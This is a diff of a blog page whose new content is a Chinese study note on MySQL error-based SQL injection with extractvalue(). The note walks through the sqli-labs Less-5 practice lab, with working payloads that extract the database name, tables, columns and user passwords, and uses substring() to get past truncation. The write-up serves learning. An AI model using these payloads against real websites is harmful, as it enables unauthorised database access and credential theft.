@@ -5,7 +5,7 @@
   <meta charset="utf-8">
   <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
   
-  <meta name="robots" content="noindex,follow">
+  
   <meta name="generator" content="Hexo 8.1.1">
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   
@@ -17,22 +17,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  <title>分类 - rabow's blog</title>
+  <title>学习笔记-SQL extractvalue报错注入 - rabow's blog</title>
 
   
-    <meta property="og:type" content="website">
-<meta property="og:title" content="分类">
-<meta property="og:url" content="https://www.rabow.com/categories/">
+    <meta name="description" content="1(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) 这句直接背下来 学习笔记：SQL 报错注入 extractvalue()1. 什么是报错注入？ 定义：当 Web 应用在后台执行 SQL 语句时，没有对用户输入进行严格的安全过滤，导致 SQL 语句拼接错误并">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习笔记-SQL extractvalue报错注入">
+<meta property="og:url" content="https://www.rabow.com/2026/03/29/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
 <meta property="og:site_name" content="rabow&#39;s blog">
+<meta property="og:description" content="1(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) 这句直接背下来 学习笔记：SQL 报错注入 extractvalue()1. 什么是报错注入？ 定义：当 Web 应用在后台执行 SQL 语句时，没有对用户输入进行严格的安全过滤，导致 SQL 语句拼接错误并">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://www.rabow.com/images/avatar.jpg">
+<meta property="article:published_time" content="2026-03-29T11:24:19.000Z">
+<meta property="article:modified_time" content="2026-03-31T12:05:13.782Z">
 <meta property="article:author" content="rabow">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="SQL">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://www.rabow.com/images/avatar.jpg">
   
   
   
-  
+  <meta name="keywords" content="SQL,CTF">
 
   <!-- feed -->
   
@@ -44,12 +50,12 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Website","@id":"https://www.rabow.com","author":{"@type":"Person","name":"rabow","sameAs":[],"image":"/images/avatar.jpg"},"name":"rabow's blog","description":"","url":"https://www.rabow.com"}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"rabow","sameAs":[],"image":"/images/avatar.jpg"},"dateCreated":"2026-03-29T19:24:19+08:00","dateModified":"2026-03-31T20:05:13+08:00","datePublished":"2026-03-29T19:24:19+08:00","description":"","headline":"学习笔记-SQL extractvalue报错注入","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.rabow.com/2026/03/29/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},"publisher":{"@type":"Organization","name":"rabow","sameAs":[],"image":"/images/avatar.jpg","logo":{"@type":"ImageObject","url":"/images/avatar.jpg"}},"url":"https://www.rabow.com/2026/03/29/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","keywords":"SQL, CTF","image":[]}</script>
   
 </head>
 <body>
 
-<div class="l_body index" id="start" layout="categories" type="undefined" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
 <header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">rabow's blog</div></a></div></header>
@@ -61,37 +67,113 @@
 <div class="widgets">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
+
+
 <widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/03/29/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL-extractvalue%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"><span class="title">学习笔记-SQL extractvalue报错注入</span></a><a class="item title" href="/2026/03/28/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SQL%E7%9A%84union%E6%B3%A8%E5%85%A5/"><span class="title">学习笔记-SQL的union注入</span></a><a class="item title" href="/2026/03/29/%E6%90%AD%E5%BB%BABlog%E7%BB%8F%E5%8E%86/"><span class="title">搭建Blog经历</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
 
-<header class="header mobile-only"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">rabow's blog</div></a></div></header>
 
 
-  
-  
-  
 
-<div class="navbar top"><div class="navbar-blur"><div class="navbar-container"><nav class="post"><a href="/">近期发布</a><a class="active" href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a></nav></div></div></div>
-  <div class='post-list'>
-    <article class='' id='cats'>
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-03-29T11:24:19.000Z">2026-03-29</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-03-31T12:05:13.782Z">2026-03-31</time></span></div></div></div>
+    
+    <div class="bottom only-title">
       
-        <div>
-          <a class="cat" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-            <span class='name'><svg style="margin-bottom:1px" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 6.95c0-.883 0-1.324.07-1.692A4 4 0 0 1 5.257 2.07C5.626 2 6.068 2 6.95 2c.386 0 .58 0 .766.017a4 4 0 0 1 2.18.904c.144.119.28.255.554.529L11 4c.816.816 1.224 1.224 1.712 1.495a4 4 0 0 0 .848.352C14.098 6 14.675 6 15.828 6h.374c2.632 0 3.949 0 4.804.77c.079.07.154.145.224.224c.77.855.77 2.172.77 4.804V14c0 3.771 0 5.657-1.172 6.828C19.657 22 17.771 22 14 22h-4c-3.771 0-5.657 0-6.828-1.172C2 19.657 2 17.771 2 14z" opacity=".5"/><path fill="currentColor" d="M20 6.238c0-.298-.005-.475-.025-.63a3 3 0 0 0-2.583-2.582C17.197 3 16.965 3 16.5 3H9.988c.116.104.247.234.462.45L11 4c.816.816 1.224 1.224 1.712 1.495a4 4 0 0 0 .849.352C14.098 6 14.675 6 15.829 6h.373c1.78 0 2.957 0 3.798.238"/><path fill="currentColor" fill-rule="evenodd" d="M12.25 10a.75.75 0 0 1 .75-.75h5a.75.75 0 0 1 0 1.5h-5a.75.75 0 0 1-.75-.75" clip-rule="evenodd"/></svg>学习笔记</span>
-            <span class='badge'>(2)</span>
-          </a>
-        </div>
-      
-    </article>
+      <div class="text-area">
+        <h1 class="text title"><span>学习笔记-SQL extractvalue报错注入</span></h1>
+        
+      </div>
+    </div>
+    
   </div>
+  </div><article class="md-text content"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select group_concat(table_name) from information_schema.tables where table_schema=database())</span><br></pre></td></tr></table></figure>
+<p>这句直接背下来</p>
+<h1 id="学习笔记：SQL-报错注入-extractvalue"><a href="#学习笔记：SQL-报错注入-extractvalue" class="headerlink" title="学习笔记：SQL 报错注入 extractvalue()"></a>学习笔记：SQL 报错注入 <code>extractvalue()</code></h1><h2 id="1-什么是报错注入？"><a href="#1-什么是报错注入？" class="headerlink" title="1. 什么是报错注入？"></a>1. 什么是报错注入？</h2><ul>
+<li><strong>定义</strong>：当 Web 应用在后台执行 SQL 语句时，没有对用户输入进行严格的安全过滤，导致 SQL 语句拼接错误并在数据库中执行失败。如果后台<strong>将数据库的报错信息未加区分地直接回显到前端页面</strong>，攻击者就可以利用这种机制获取数据。</li>
+<li><strong>前提条件</strong>：Web 页面必须要有数据库报错信息的<strong>回显</strong>。</li>
+<li><strong>与 Union 注入的区别</strong>：Union 注入需要页面有数据查询结果的显示位，而报错注入只需要页面能显示错误信息即可。<br><img src="/images/2026-03-31-19-28-41.png" alt="无回显位"><br>如图并没有回显位</li>
+</ul>
+<h2 id="2-核心原理"><a href="#2-核心原理" class="headerlink" title="2. 核心原理"></a>2. 核心原理</h2><p>攻击者故意构造语法错误的 SQL 语句，并在错误的位置嵌入我们需要查询的子查询语句。当数据库报错时，会将这个子查询语句的执行结果作为错误信息的一部分抛出，从而让我们在前端页面看到想要的数据。</p>
+<h2 id="3-extractvalue-函数详解"><a href="#3-extractvalue-函数详解" class="headerlink" title="3. extractvalue() 函数详解"></a>3. <code>extractvalue()</code> 函数详解</h2><p>有十几种引发报错的函数，但最常用的有 <code>floor()</code>、<code>extractvalue()</code> 和 <code>updatexml()</code>。这次的重点是 <code>extractvalue()</code>。</p>
+<ul>
+<li><strong>原始功能</strong>：用于从 XML 文档中查询数据。</li>
+<li><strong>语法</strong>：<code>extractvalue(xml_document, xpath_string)</code><ul>
+<li><code>xml_document</code>：XML 文档对象名称（注入时可随便写，如 <code>1</code> 或 <code>doc</code>）。</li>
+<li><code>xpath_string</code>：XPath 路径（关键注入点）。</li>
+</ul>
+</li>
+<li><strong>报错机制</strong>：XPath 的格式有严格要求（通常以 <code>/</code> 开头）。如果我们在第二个参数中传入了<strong>不符合 XPath 格式的字符串</strong>（例如以 <code>~</code> 开头，十六进制为 <code>0x7e</code>），MySQL 就会报错，并且<strong>在报错信息中会将你传入的错误路径原样输出</strong>。</li>
+<li><strong>构造 Payload 原理</strong>：使用 <code>concat()</code> 函数将非法字符（如 <code>0x7e</code>）与我们的子查询拼接到一起，作为 <code>xpath_string</code> 传入。<ul>
+<li>例如：<code>extractvalue(1, concat(0x7e, (SELECT database())))</code></li>
+<li>报错结果类似：<code>XPATH syntax error: &#39;~security&#39;</code> （其中 security 就是子查询查出的当前数据库名）。</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-实战注入步骤-以-sqli-labs-Less-5-为例"><a href="#4-实战注入步骤-以-sqli-labs-Less-5-为例" class="headerlink" title="4. 实战注入步骤 (以 sqli-labs Less-5 为例)"></a>4. 实战注入步骤 (以 sqli-labs Less-5 为例)</h2><p><strong>Step 1: 判断是否存在报错注入</strong><br>输入单引号 <code>?id=1&#39;</code>，观察页面是否报出 SQL 语法错误。<br><img src="/images/2026-03-31-19-31-02.png" alt="报出语法错误"><br>这里可以看到，报出了语法错误，证明为字符型注入，且闭合符号为单引号</p>
+<p><strong>Step 2: 爆当前数据库名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; and 1=extractvalue(1, concat(0x7e, (select database()))) --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/2026-03-31-19-34-23.png" alt="数据库名"></p>
+<p><strong>Step 3: 爆表名 (Table Name)</strong><br>利用 <code>information_schema.tables</code> 查表名。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; and 1=extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/2026-03-31-19-48-11.png" alt="表名"></p>
+<p><strong>Step 4: 爆列名&#x2F;字段名 (Column Name)</strong><br>假设查到有 <code>users</code> 表，继续查它的列。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; and 1=extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27;))) --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/2026-03-31-19-49-24.png" alt="列名"><br>可以看到查到了 <code>username</code> 和 <code>password</code> 列。</p>
+<p><strong>Step 5: 爆具体数据</strong><br>现在把 <code>username</code> 和 <code>password</code> 列进行报错回显。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; and 1=extractvalue(1, concat(0x7e, (select group_concat(username, &#x27;</span><span class="operator">~</span><span class="string">&#x27;, password) from users))) --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/2026-03-31-20-00-43.png" alt="具体数据"><br>可以看到这里也是成功爆出关键数据了，不过数据不能完整显示</p>
+<h2 id="5-突破32-位字符限制"><a href="#5-突破32-位字符限制" class="headerlink" title="5. 突破32 位字符限制"></a>5. 突破32 位字符限制</h2><ul>
+<li><strong>限制</strong>：<code>extractvalue()</code> 报错回显的字符串<strong>最多只能显示 32 个字符</strong>。如果有大量数据（如使用了 <code>group_concat</code>），多余的部分会被截断。</li>
+<li><strong>突破方法</strong>：使用 <code>substring()</code> 函数分段截取。<ul>
+<li><strong>语法</strong>：<code>substring(字符串, 起始位置, 截取长度)</code></li>
+<li><strong>示例 (截取前 30 个字符)</strong>：  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; and 1=extractvalue(1, concat(0x7e, substring((select group_concat(username, &#x27;</span><span class="operator">~</span><span class="string">&#x27;, password) from users), 1, 30))) --+</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>示例 (截取后续字符)</strong>：将起始位置往后移，比如改为 <code>31</code> 继续获取：  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; and 1=extractvalue(1, concat(0x7e, substring((select group_concat(username, &#x27;</span><span class="operator">~</span><span class="string">&#x27;, password) from users), 31, 30))) --+</span></span><br></pre></td></tr></table></figure>
+  <img src="/images/2026-03-31-20-04-18.png" alt="回显第31位后续"></li>
+</ul>
+</li>
+</ul>
+<h2 id="6-易错点"><a href="#6-易错点" class="headerlink" title="6. 易错点"></a>6. 易错点</h2><ol>
+<li><strong>路径前缀必须非法</strong>：<code>extractvalue</code> 的第二个参数最前面必须要有非法字符（如 <code>0x7e</code> 表示的 <code>~</code>），如果没有（例如直接写 <code>title</code>），即使找不到内容也不会报错，只会返回空。</li>
+<li><strong>括号匹配</strong>：编写复杂的 Payload 时（涉及 <code>concat</code>, <code>extractvalue</code>, 子查询），非常容易少写或多写右括号 <code>)</code>，建议从内向外一层层写并仔细检查。</li>
+<li><strong>关键词拼写</strong>：如 <code>information_schema</code> 等长单词容易拼错，需要格外注意。</li>
+</ol>
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select group_concat(table_name) from information_schema.tables where table_schema=database())</span><br></pre></td></tr></table></figure>
+<p>这句直接背下来，用的很多</p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2026/03/29/%E6%90%AD%E5%BB%BABlog%E7%BB%8F%E5%8E%86/">搭建Blog经历</a></div></section></div>
+
+
+
+
 
 
 <footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">rabow</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
 </div></footer>
 <div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
-</aside><div class='float-panel'>
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9ASQL-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-extractvalue"><span class="toc-text">学习笔记：SQL 报错注入 extractvalue()</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-text">1. 什么是报错注入？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-text">2. 核心原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-extractvalue-%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-text">3. extractvalue() 函数详解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%AE%9E%E6%88%98%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4-%E4%BB%A5-sqli-labs-Less-5-%E4%B8%BA%E4%BE%8B"><span class="toc-text">4. 实战注入步骤 (以 sqli-labs Less-5 为例)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E7%AA%81%E7%A0%B432-%E4%BD%8D%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="toc-text">5. 突破32 位字符限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%98%93%E9%94%99%E7%82%B9"><span class="toc-text">6. 易错点</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
   </button>
